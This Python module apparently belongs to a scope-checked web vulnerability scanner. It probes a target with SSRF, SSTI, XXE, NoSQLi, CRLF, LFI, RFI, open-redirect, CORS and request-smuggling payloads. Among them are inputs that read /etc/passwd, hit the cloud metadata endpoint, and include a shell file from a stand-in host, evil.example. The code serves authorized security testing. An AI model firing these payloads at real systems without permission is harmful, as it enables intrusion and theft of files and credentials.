from urllib.parse import quote

from core.logger import Logger
from core.http_utils import build_session


SSTI_PRODUCT = str(1337 * 7331)

TEST_CASES = [
    ("SSRF", "/?url=http://169.254.169.254/latest/meta-data/"),
    # Unique product: "49" appears on countless pages, 9801547 essentially never does.
    ("SSTI", "/?name=" + quote("{{1337*7331}}${1337*7331}")),
    ("XXE", "/?xml=" + quote("""<?xml version="1.0"?><!DOCTYPE x [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><a>&xxe;</a>""")),
    ("NoSQLi", "/?username[$ne]=1&password[$ne]=1"),
    ("CRLF", "/%0d%0aSet-Cookie:crlf=1"),
    ("LFI", "/?file=../../../../etc/passwd"),
    ("RFI", "/?file=http://evil.example/shell.txt"),
    ("Open Redirect", "/?next=https://example.com"),
    ("CORS", "/"),
]


def run_classic_vuln_scans(engine):
    findings = []
    session = build_session(engine.config)
    classic_cfg = engine.config.get("tuning", {}).get("classic", {})
    include_manual_review = bool(classic_cfg.get("include_manual_review", False))
    smuggling_codes = set(classic_cfg.get("smuggling_status_codes", [400, 411, 413, 500, 502]))

    for label, path in TEST_CASES:
        url = f"{engine.target}{path}"
        if not engine.scope.is_in_scope(url):
            continue
        try:
            r = session.get(url, allow_redirects=False)
            body = (r.text or "").lower()
            h = {k.lower(): v for k, v in r.headers.items()}
            if label == "SSTI" and SSTI_PRODUCT in body:
                findings.append(f"SSTI: template expression evaluated ({SSTI_PRODUCT} rendered)")
            elif label == "XXE" and "root:x:" in body:
                findings.append("XXE: file disclosure indicator")
            elif label in {"LFI", "RFI"} and "root:x:" in body:
                findings.append(f"{label}: file inclusion indicator")
            elif label == "CORS" and h.get("access-control-allow-origin") == "*":
                findings.append("CORS: wildcard ACAO on root endpoint")
            elif label == "Open Redirect" and 300 <= r.status_code < 400 and "example.com" in h.get("location", ""):
                findings.append("Open Redirect: unvalidated redirect target")
            elif label == "CRLF" and "crlf=1" in h.get("set-cookie", "").lower():
                findings.append("CRLF: header injection behavior observed")
            elif include_manual_review and label in {"SSRF", "NoSQLi"} and any(k in body for k in ["denied", "unauthorized", "metadata", "mongodb", "nosql"]):
                findings.append(f"{label}: behavior requires manual review")
        except Exception:
            continue

    # Request smuggling heuristic
    try:
        crafted_headers = {"Transfer-Encoding": "chunked", "Content-Length": "4"}
        r = session.post(engine.target, data="0\r\n\r\n", headers=crafted_headers)
        if r.status_code in smuggling_codes:
            findings.append("Request Smuggling: ambiguous TE/CL handling heuristic observed")
    except Exception:
        pass

    Logger.success(f"Classic scans: {len(findings)} findings")
    return findings
